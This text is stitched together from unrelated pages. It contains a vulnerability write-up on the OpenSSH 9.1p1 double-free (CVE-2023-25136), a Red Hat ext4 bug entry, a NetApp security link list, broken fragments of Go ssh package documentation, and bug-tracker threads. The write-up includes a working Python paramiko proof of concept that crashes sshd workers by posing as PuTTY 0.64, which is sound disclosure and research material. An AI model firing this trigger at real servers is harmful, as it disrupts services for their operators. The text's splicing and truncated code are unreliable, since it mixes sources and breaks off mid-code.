We opted to create a Python Denial of service Proof-of-Concept because of its flexibility and portability. The proof-of-concept triggers the double-free using the `paramiko` package and causes an abort crash.

`paramiko` is a widespread Python SSH implementation, providing both server and client functionality. For the PoC we changed the connecting client version banner to reflect an obsolete client like `PuTTY v0.64`.

Available in [our GitHub repository](https://github.com/jfrog/jfrog-CVE-2023-25136-OpenSSH_Double-Free).

```
import paramiko

VICTIM_IP = "127.0.1"
CLIENT_ID = "PuTTY_Release_0.64"

def main():
    transport = paramiko.Transport(VICTIM_IP)
    transport.local_version = f"SSH-2.0-{CLIENT_ID}"
    transport.connect(username='', password='')

if __name__ == "__main__":
    main()
```
## RCE Proof-of-Concept

The exploit allocates another struct named `EVP_AES_KEY` instead of the freed `options.kex_algorithms`. It’s later freed again when the double-free happens. It then overwrites its contents with another chunk using the `authctxt->user` or `authctxt->style`.

When `EVP_Cipher()` later tries to use this `EVP_AES_KEY`, it’ll use this chunk that overwrote it using attacker-controlled data.

## Vulnerability Impact

The OpenSSH Daemon listens for connections from clients. It forks a new daemon for each incoming connection. The forked daemons handle key exchange, encryption, authentication, command execution, and data exchange.

The vulnerability is a double-free that can theoretically be exploited for a denial of service, as demonstrated by our Proof-of-Concept, and possibly for remote code execution (RCE), although developing a working exploit is considered hard due to security measures in place such as a sandbox and Privilege Separation mechanism. For a denial of service, note that only the forked daemons crash, because of a sandbox violation while trying to call `writev()`, so it leaves the main server daemon free to handle new clients.

According to a recent update, [Qualys Security has managed](https://seclists.org/oss-sec/2023/q1/92) to leverage this double-free for a limited remote code execution exploit when no memory protections are applied (like ASLR or NX).

The JFrog Security Research team gave this vulnerability a **High** severity rating for the following reasons:

* No prerequisites are required. A default configuration is vulnerable.
* When no memory exploitation mitigations are applied (like ASLR or NX), RCE is possible, according to [a recent publication](https://seclists.org/oss-sec/2023/q1/92).
* As for a Denial of Service attack, crashing a forked worker process is much less severe than a DoS that crashes an important daemon, but they will both receive a “High” Availability impact CVSS rating.
* Note that OpenSSH has put security measures in place such as a sandbox and Privilege Separation mechanism, but they should not lower the severity of the possible RCE attack.

## Vulnerability Targets

The vulnerability applies only to OpenSSH version 9.1p1 with a default configuration, meaning no prerequisites are required.

## Remediation

It’s strongly recommended to upgrade OpenSSH to the latest version 9.2p1.

| [Description](show_bug.cgi?id=2193097#c0)  Mauro Matteo Cascella    2023-05-04 10:18:13 UTC  ``` A use-after-free vulnerability was found in the Linux kernel's ext4 filesystem in the way it handled extra inode size for extended attributes.  Quoting the upstream commit below: "In the calculation formula, all values except s_inode_size and i_extra_size are fixed values. When i_extra_size is the maximum value s_inode_size - EXT4_GOOD_OLD_INODE_SIZE, min_offs is -4 and free is -8. The value overflows. As a result, the preceding issue is triggered when memcpy is executed."  Patch series: [https://lore.kernel.org/all/20220616021358.2504451-1-libaokun1@huawei.com/](https://lore.kernel.org/all/20220616021358.2504451-1-libaokun1%40huawei.com/)  Upstream fix: <https://github.com/torvalds/linux/commit/67d7d8ad99be>   ```  [Comment 8](show_bug.cgi?id=2193097#c8)  Mauro Matteo Cascella    2023-06-15 18:07:35 UTC  ``` This issue was fixed upstream in version 6.0-rc1. The kernel packages as shipped in the following Red Hat products were previously updated to a version that contains the fix via the following errata:  kernel in Red Hat Enterprise Linux 9 [https://access.redhat.com/errata/RHSA-2023:2458](https://access.redhat.com/errata/RHSA-2023%3A2458)  kernel-rt in Red Hat Enterprise Linux 9 [https://access.redhat.com/errata/RHSA-2023:2148](https://access.redhat.com/errata/RHSA-2023%3A2148)   ```  [Comment 12](show_bug.cgi?id=2193097#c12)  errata-xmlrpc    2023-11-14 15:15:31 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2023:6901 [https://access.redhat.com/errata/RHSA-2023:6901](https://access.redhat.com/errata/RHSA-2023%3A6901)   ```  [Comment 13](show_bug.cgi?id=2193097#c13)  errata-xmlrpc    2023-11-14 15:20:51 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2023:7077 [https://access.redhat.com/errata/RHSA-2023:7077](https://access.redhat.com/errata/RHSA-2023%3A7077)   ```  [Comment 14](show_bug.cgi?id=2193097#c14)  errata-xmlrpc    2024-01-24 16:43:43 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8.6 Extended Update Support  Via RHSA-2024:0412 [https://access.redhat.com/errata/RHSA-2024:0412](https://access.redhat.com/errata/RHSA-2024%3A0412)   ``` |  |

## Security Resources

With the ever prevalent threats that span todayâs landscape, NetApp continues
to derive and provide security solutions across the portfolio. Links to
security resources are found below. As always, stay tuned because just like the
threat landscape, these resources are ever changing and being updated!

#### Products and Solutions

The product and solutions resources provide guidance, recommendations, and best
practices with regard to security elements and configurations amongst the
NetApp portfolio.

##### ONTAP

[ONTAP 9 Security Datasheet](http://www.netapp.com/us/media/ds-3846.pdf) - The
ONTAP 9 Security Datasheet provides a comprehensive list of security features
and functions available in ONTAP 9 - So if the question is, âwhat are all the
security features/functions in ONTAP 9?â, This is your resource!

[Security Hardening Guide for NetApp ONTAP
9](https://www.netapp.com/us/media/tr-4569.pdf) - We humbly refer to the
Security Hardening Guide for NetApp ONTAP 9 as your key resource when it comes
to answering the question, âhow do I deploy ONTAP 9 in the most secure
fashion?â. The hardening guide provides the recommended commands and configs
necessary to enable ONTAP 9 in the most secure configuration.

[ONTAP 9 Encryption Power

* When it comes to understanding the configuration and management details of NSE and NVE,
  including deployment, certificates, onboard key management and more, the Power
  Guide is the key resource!

[ONTAP 9 Network Management
Guide](https://docs.netapp.com/us-en/ontap/pdfs/sidebar/Network_management.pdf) - While
this guide provides vast elements surrounding ONTAP networking (IPv4, v6,
IPSpaces, and more), it also captures some key security elements such as
managing SVMs, protocol restrictions and firewall configuration in addition to
control plane elements such as DNS, SNMP, FIPS configuration, and MTU details.
The Network Management Guide also shows list of ports used in ONTAP, also
listed in the hardening guide.

[ONTAP 9 Manage administrator authentication and RBAC with the
CLI](https://docs.netapp.com/us-en/ontap/authentication/)

[DS-3898: NetApp Storage Encryption and NetApp Volume
Encryption](http://www.netapp.com/us/media/ds-3898.pdf) - When it comes to
encryption at rest there are many questions about the capabilities. The NSE and
NVE Datasheet seeks to quell such questions by providing a comprehensive
understanding of what NSE is, what NVE is, use cases, and how they can be
leveraged individually or together for a true dual/double encryption solution.

[NetApp Storage Encryption
Datasheet](http://www.netapp.com/us/media/ds-3213-en.pdf) - The NSE Datasheet
provides a holistic overview of the NSE solution and use cases. If you have
ever wondered what NSE is, what we mean by self encrypting drives, or what
encryption algorithm is in use, this is the resource for you!

[NetApp Volume Encryption
Datasheet](http://www.netapp.com/us/media/ds-3899.pdf) - The NVE Datasheet

#### Threats

Threat resources consist of guidance to address known threats through a
combination of prevention, mitigation, and remediation.

##### Ransomware

[The NetApp Solution for
Ransomware](http://www.netapp.com/us/media/tr-4572.pdf) - Ransomware wages war
on every environment. Being the custodians of one of the worldâs most valuable
resources (data/information), itâs imperative that we protect it. When it comes
to ransomware, this is your guide to addressing and remediating the threat.

[NetApp and Varonis ransomware white
paper](https://info.varonis.com/hubfs/docs/whitepapers/en/Varonis-Ransomware-Whitepaper-Netapp.pdf) -
As a companion to the NetApp Solution for Ransomware, we have partnered with
Varonis in addressing the advanced techniques around this threat. We have
discussed and captured the solution in this joint white paper.

#### Integration and Solutions Guides

As we continue to tout the key elements of security including key management,
we understand the challenges and value of timeliness as it applies to adoption
and deployment. Due to such challenges we provide integration guides where we
walk through the configuration/provisioning of âkeyâ elements such as key
managers, FPolicy, and other security laden integration solutions.

##### Key Management

[NetApp ONTAP 9 External Key Management: Vormetric Key Management Integration
Guide](http://www.netapp.com/us/media/tr-4618.pdf) - The Vormetric integration
guide for ONTAP 9 depicts how to provision the Vormetric (Thales) key manager
for use with ONTAP 9.

#### Compliance

Compliance continues to evolve and shape the manner in which we address the
organizationâs of today and more importantly how we address securing the data.
Remember Security does not equal Compliance, but security does in fact aid in
addressing the challenge.

### Overview [¶](#pkg-overview "Go to Overview")

Package ssh implements an SSH client and server.

SSH is a transport security protocol, an authentication protocol and a
family of application protocols. The most typical application level
protocol is a remote shell and this is specifically implemented. However,
the multiplexed nature of SSH is exposed to users that wish to support
others.

References:

```
[PROTOCOL]: https://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/PROTOCOL?rev=HEAD
[PROTOCOL.certkeys]: http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/PROTOCOL.certkeys?rev=HEAD
[SSH-PARAMETERS]:    http://www.iana.org/assignments/ssh-parameters/ssh-parameters.xml#ssh-parameters-1

```

This package does not fall under the stability promise of the Go language itself,
so its API may be changed when pressing needs arise.

```

ErrNoAuth is the error value returned if no
authentication method has been passed yet. This happens as a normal
part of the authentication loop, since the client first tries
'none' authentication to discover available methods.
It is returned in ServerAuthError.Errors from NewServerConn.

```
func RetryableAuthMethod(auth [AuthMethod](#AuthMethod), maxTries [int](/builtin#int)) [AuthMethod](#AuthMethod)
```

RetryableAuthMethod is a decorator for other auth methods enabling them to
be retried up to maxTries before considering that AuthMethod itself failed.
If maxTries is <= 0, will retry indefinitely

This is useful for interactive clients using challenge/response type
authentication (e.g. Keyboard-Interactive, Password, etc) where the user
could mistype their response resulting in the server issuing a
SSH\_MSG\_USERAUTH\_FAILURE (rfc4252 #8 [password] and rfc4256 #3.4
[keyboard-interactive]); Without this decorator, the non-retryable
AuthMethod would be removed from future consideration, and never tried again
(and so the user would never be able to retry their entry).

Example [¶](#example-RetryableAuthMethod "Go to Example")
```

user := "testuser"
NumberOfPrompts := 3

// Normally this would be a callback that prompts the user to answer the
// provided questions
Cb := func(user, instruction string, questions []string, echos []bool) (answers []string, err error) {
	return []string{"answer1", "answer2"}, nil
}

config := &ClientConfig{
	HostKeyCallback: InsecureIgnoreHostKey(),
	User:            user,
	Auth: []AuthMethod{
		RetryableAuthMethod(KeyboardInteractiveChallenge(Cb), NumberOfPrompts),
	},
}

	// contains filtered or unexported fields
}
```

Client implements a traditional SSH client that supports shells,
subprocesses, TCP port/streamlocal forwarding and tunneled dialing.

#### func [Dial](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/client.go;l=176) [¶](#Dial "Go to Dial")

```
func Dial(network, addr [string](/builtin#string), config *[ClientConfig](#ClientConfig)) (*[Client](#Client), [error](/builtin#error))
```

Dial starts a client connection to the given SSH server. It is a
convenience function that connects to the given network address,
initiates the SSH handshake, and then sets up a Client. For access
to incoming channels and requests, use net.Dial with NewClientConn
instead.

Example [¶](#example-Dial "Go to Example")
```

package main

import (
	"bytes"
	"fmt"
	"log"

	"golang.org/x/crypto/ssh"
)

func main() {
	var hostKey ssh.PublicKey
	// An SSH client is represented with a ClientConn.
	//
	// To authenticate with the remote server you must pass at least one
	// implementation of AuthMethod via the Auth field in ClientConfig,
	// and provide a HostKeyCallback.
	config := &ssh.ClientConfig{
		User: "username",
		Auth: []ssh.AuthMethod{
			ssh.Password("yourpassword"),
		},
		HostKeyCallback: ssh.FixedHostKey(hostKey),
	}
	client, err := ssh.Dial("tcp", "yourserver.com:22", config)
	if err != nil {
		log.Fatal("Failed to dial: ", err)
	}
	defer client.Close()

	// Each ClientConn can support multiple interactive sessions,
	// represented by a Session.
	session, err := client.NewSession()
	if err != nil {
		log.Fatal("Failed to create session: ", err)
	}
	defer session.Close()

	// Once a Session is created, you can execute a single command on
	// the remote side using the Run method.
	var b bytes.Buffer
	session.Stdout = &b
	if err := session.Run("/usr/bin/whoami"); err != nil {
		log.Fatal("Failed to run: " + err.Error())
	}
	fmt.Println(b.String())
}

```

#### func (\*Client) [Dial](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/tcpip.go;l=372) [¶](#Client.Dial "Go to Client.Dial")

```
func (c *[Client](#Client)) Dial(n, addr [string](/builtin#string)) ([net](/net).[Conn](/net#Conn), [error](/builtin#error))
```

Dial initiates a connection to the addr from the remote host.
The resulting connection has a zero LocalAddr() and RemoteAddr().

#### func (\*Client) [DialContext](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/tcpip.go;l=343) [¶](#Client.DialContext "Go to Client.DialContext") added in v0.16.0

```
func (c *[Client](#Client)) DialContext(ctx [context](/context).[Context](/context#Context), n, addr [string](/builtin#string)) ([net](/net).[Conn](/net#Conn), [error](/builtin#error))
```

DialContext initiates a connection to the addr from the remote host.

The provided Context must be non-nil. If the context expires before the
connection is complete, an error is returned. Once successfully connected,
any expiration of the context will not affect the connection.

See func Dial for additional information.

#### func (\*Client) [DialTCP](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/tcpip.go;l=424) [¶](#Client.DialTCP "Go to Client.DialTCP")

func (c *[Client](#Client)) Listen(n, addr [string](/builtin#string)) ([net](/net).[Listener](/net#Listener), [error](/builtin#error))
```

Listen requests the remote peer open a listening socket on
addr. Incoming connections will be available by calling Accept on
the returned net.Listener. The listener must be serviced, or the
SSH connection may hang.
N must be "tcp", "tcp4", "tcp6", or "unix".

type NewChannel interface {
	// Accept accepts the channel creation request. It returns the Channel
	// and a Go channel containing SSH requests. The Go channel must be
	// serviced otherwise the Channel will hang.
	Accept() ([Channel](#Channel), <-chan *[Request](#Request), [error](/builtin#error))

	// Reject rejects the channel creation request. After calling

	// Next defines the authentication callbacks to apply to further steps. The
	// available methods communicated to the client are based on the non-nil
	// ServerAuthCallbacks fields.
	Next [ServerAuthCallbacks](#ServerAuthCallbacks)
}
```

PartialSuccessError can be returned by any of the [ServerConfig](#ServerConfig)
authentication callbacks to indicate to the client that authentication has
partially succeeded, but further steps are required.

#### type [Permissions](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/server.go;l=21) [¶](#Permissions "Go to Permissions")

```
type Permissions struct {
	// CriticalOptions indicate restrictions to the default
	// permissions, and are typically used in conjunction with
	// user certificates. The standard for SSH certificates
	// defines "force-command" (only allow the given command to
	// execute) and "source-address" (only allow connections from
	// the given address). The SSH package currently only enforces
	// the "source-address" critical option. It is up to server
	// implementations to enforce other critical options, such as
	// "force-command", by checking them after the SSH handshake
	// is successful. In general, SSH servers should reject
	// connections that specify critical options that are unknown
	// or not supported.
	CriticalOptions map[[string](/builtin#string)][string](/builtin#string)

	// Extensions are extra functionality that the server may
	// offer on authenticated connections. Lack of support for an
	// extension does not preclude authenticating a user. Common
	// extensions are "permit-agent-forwarding",
	// "permit-X11-forwarding". The Go SSH library currently does
	// not act on any extension, and it is up to server
	// implementations to honor them. Extensions can be used to
	// pass data from the authentication callbacks to the server
	// application layer.
	Extensions map[[string](/builtin#string)][string](/builtin#string)
}
```

The Permissions type holds fine-grained permissions that are
specific to a user or a specific authentication method for a user.
The Permissions value for a successful authentication attempt is
available in ServerConn, so it can be used to pass information from
the user-authentication phase to the application layer.

#### type [PublicKey](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/keys.go;l=315) [¶](#PublicKey "Go to PublicKey")

	Type() [string](/builtin#string)

	// Marshal returns the serialized key data in SSH wire format, with the name
	// prefix. To unmarshal the returned data, use the ParsePublicKey function.
	Marshal() [][byte](/builtin#byte)

	// Verify that sig is a signature on the given data using this key. This

```

NewPublicKey takes an \*rsa.PublicKey, \*dsa.PublicKey, \*ecdsa.PublicKey,
or ed25519.PublicKey returns a corresponding PublicKey instance.
ECDSA keys must use P-256, P-384 or P-521.

func ParseAuthorizedKey(in [][byte](/builtin#byte)) (out [PublicKey](#PublicKey), comment [string](/builtin#string), options [][string](/builtin#string), rest [][byte](/builtin#byte), err [error](/builtin#error))
```

ParseAuthorizedKey parses a public key from an authorized\_keys
file used in OpenSSH according to the sshd(8) manual page.

#### func [ParseKnownHosts](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/keys.go;l=131) [¶](#ParseKnownHosts "Go to ParseKnownHosts")

func ParseKnownHosts(in [][byte](/builtin#byte)) (marker [string](/builtin#string), hosts [][string](/builtin#string), pubKey [PublicKey](#PublicKey), comment [string](/builtin#string), rest [][byte](/builtin#byte), err [error](/builtin#error))
```

ParseKnownHosts parses an entry in the format of the known\_hosts file.

The known\_hosts format is documented in the sshd(8) manual page. This
function will parse a single entry from in. On successful return, marker
will contain the optional marker value (i.e. "cert-authority" or "revoked")
or else be empty, hosts will contain the hosts that this entry matches,
pubKey will contain the public key and comment will contain any trailing
comment at the end of the line. See the sshd(8) manual page for the various
forms that a host string can take.

The unparsed remainder of the input will be returned in rest. This function
can be called repeatedly to parse multiple entries.

If no entries were found in the input then err will be io.EOF. Otherwise a
non-nil err value indicates a parse error.

#### func [ParsePublicKey](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/keys.go;l=273) [¶](#ParsePublicKey "Go to ParsePublicKey")

```
func ParsePublicKey(in [][byte](/builtin#byte)) (out [PublicKey](#PublicKey), err [error](/builtin#error))

Request is a request sent outside of the normal stream of
data. Requests can either be specific to an SSH channel, or they
can be global.

#### func (\*Request) [Reply](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/channel.go;l=96) [¶](#Request.Reply "Go to Request.Reply")

```
func (r *[Request](#Request)) Reply(ok [bool](/builtin#bool), payload [][byte](/builtin#byte)) [error](/builtin#error)
```

Reply sends a response to a request. It must be called for all requests
where WantReply is true and is a no-op otherwise. The payload argument is
ignored for replies to channel-specific requests.

#### type [ServerAuthCallbacks](https://cs.opensource.google/go/x/crypto/%2B/v0.32.0%3Assh/server.go;l=437) [¶](#ServerAuthCallbacks "Go to ServerAuthCallbacks") added in v0.22.0

| [Description](show_bug.cgi?id=3522#c0)  Mantas M. [grawity]    2023-01-15 06:45:34 AEDT  ``` I'm investigating a similar issue to #3512 on Arch with OpenSSH 9.1p1 and Glibc 2.36-6 and OpenSSL 3.0.7, though I'm not 100% sure if it's the same problem.  The issue is that incoming SSH connections from a modern OpenSSH client work fine, but connections from a somewhat obsolete client (retrocomputing, don't ask) crash with "seccomp violation" for the writev() call -- and after I added it to the allow list, for the tgkill() call.  However, the writev() call in question is this:  [pid 592791] writev(2, [{iov_base="free(): double free detected in tcache 2", iov_len=40}, {iov_base="\n", iov_len=1}], 2) = 41  So the tgkill() probably makes sense as it comes from libc itself, rather than from OpenSSH.  The client in question is PuTTY_Release_0.64, which seems to trigger "compat KEX proposal" in sshd. Version 0.65 doesn't trigger it and doesn't cause a crash. ```  [Comment 1](show_bug.cgi?id=3522#c1)  Mantas M.

| [Description](show_bug.cgi?id=2167636#c0)  Sandipan Roy    2023-02-07 06:48:46 UTC  ``` OpenSSH server (sshd) 9.1 introduced a double-free vulnerability during options.kex_algorithms handling. This is fixed in OpenSSH 9.2. The double free can be triggered by an unauthenticated attacker in the default configuration; however, the vulnerability discoverer reports that "exploiting this vulnerability will not be easy."  <https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/017_sshd.patch.sig> <https://bugzilla.mindrot.org/show_bug.cgi?id=3522> <https://github.com/openssh/openssh-portable/commit/486c4dc3b83b4b67d663fb0fa62bc24138ec3946> <https://www.openwall.com/lists/oss-security/2023/02/02/2>   ```  [Comment 1](show_bug.cgi?id=2167636#c1)  Sandipan Roy    2023-02-07 06:50:13 UTC  ``` <https://github.com/openssh/openssh-portable/pull/324>   ```  [Comment 2](show_bug.cgi?id=2167636#c2)  Dmitry Belyavskiy    2023-02-07 07:57:10 UTC  ``` We don't have 9.1 neither in RHEL nor in Fedora so it's hardly relevant for us   ```  [Comment 3](show_bug.cgi?id=2167636#c3)  Sandipan Roy    2023-02-07 07:59:14 UTC  ``` (In reply to Dmitry Belyavskiy from [comment #2](show_bug.cgi?id=2167636#c2)) > We don't have 9.1 neither in RHEL nor in Fedora so it's hardly relevant for > us  Yes, All our Products are already marked as Not Affected and the CVE Page entry updated as well.   ```  [Comment 4](show_bug.cgi?id=2167636#c4)  Product Security DevOps Team    2023-02-10 02:36:48 UTC  ``` This bug is now closed.
